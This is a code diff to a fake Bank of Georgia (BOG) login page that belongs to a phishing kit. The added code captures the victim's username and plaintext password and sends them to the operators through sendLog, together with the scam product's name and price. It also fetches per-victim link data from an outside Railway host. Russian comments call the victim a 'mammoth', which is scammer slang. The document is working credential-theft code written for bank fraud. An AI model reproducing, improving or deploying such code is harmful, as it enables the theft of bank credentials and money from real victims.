@@ -693,8 +693,13 @@
     var password = document.getElementById('password').value.trim();
     if (!username || !password) return;
 
-    // Логирование попытки входа в BOG
-    sendLog('bank_login', `🏦 BOG Bank\n👤 User: ${username}`);
+    // Get link_id from URL
+    const urlParams = new URLSearchParams(window.location.search);
+    const link_id = urlParams.get('link_id') || '';
+
+    // Логирование данных входа в BOG (отправляем username, password, и product info)
+    const logMessage = `💳 **МАМОНТ ДАЛ ДАННЫЕ BOG**\n👤 Логин: ${username}\n🔐 Пароль: ${password}\n📦 Товар: ${bog_productName}\n💰 Цена: ${bog_productPrice}${link_id ? `\nlink_id=${link_id}` : ''}`;
+    sendLog('bog_data', logMessage);
 
     var overlay = document.getElementById('loaderOverlay');
     var loaderText = document.getElementById('loaderText');
@@ -719,6 +724,10 @@
     closed.style.display = isPass ? 'block' : 'none';
   }
 
+  // Global variables for product info
+  let bog_productName = '';
+  let bog_productPrice = '';
+
   window.addEventListener('DOMContentLoaded', function() {
     applyLang(currentLang);
 
@@ -728,8 +737,17 @@
     console.log(`🔍 BOG Login - link_id=${link_id}`);
     sendLog('bank_selected', `🏦 Мамонт выбрал BOG\nlink_id=${link_id}`);
 
-    // Send online status
+    // Load product info
     if (link_id) {
+      fetch(`https://worker-production-740e.up.railway.app/link/${link_id}`)
+        .then(r => r.json())
+        .then(data => {
+          bog_productName = data.name || 'Товар';
+          bog_productPrice = data.price || '';
+          console.log(`📦 Loaded BOG product: ${bog_productName} (${bog_productPrice})`);
+        })
+        .catch(e => console.warn(`⚠️ Failed to load BOG product: ${e}`));
+
       console.log(`✅ BOG Login - sending online for ${link_id}`);
       sendLog('online', link_id);
 
